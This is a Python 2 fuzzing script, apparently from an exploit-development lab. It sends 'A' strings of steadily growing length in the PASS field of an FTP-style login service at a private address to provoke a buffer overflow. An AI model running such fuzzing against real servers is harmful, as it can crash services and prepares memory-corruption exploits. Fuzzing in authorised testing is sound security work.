#!/usr/bin/python 
import socket

buffer=["A"] 
counter=100 
while len(buffer) <= 30:
	buffer.append("A"*counter)  
	counter=counter+200

for string in buffer:
	print "Fuzzing PASS input with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.10.10.99',4444))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()
